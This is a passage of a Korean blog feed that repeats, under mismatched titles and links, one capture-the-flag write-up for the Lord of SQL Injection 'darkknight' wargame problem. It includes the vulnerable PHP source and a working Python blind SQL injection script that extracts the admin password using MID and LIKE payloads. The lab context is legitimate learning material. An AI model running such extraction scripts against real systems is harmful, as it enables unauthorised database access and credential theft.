class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-16-zombie-assassin/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-16-zombie-assassin/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.607Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-15-assassin/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-15-assassin/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.607Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span 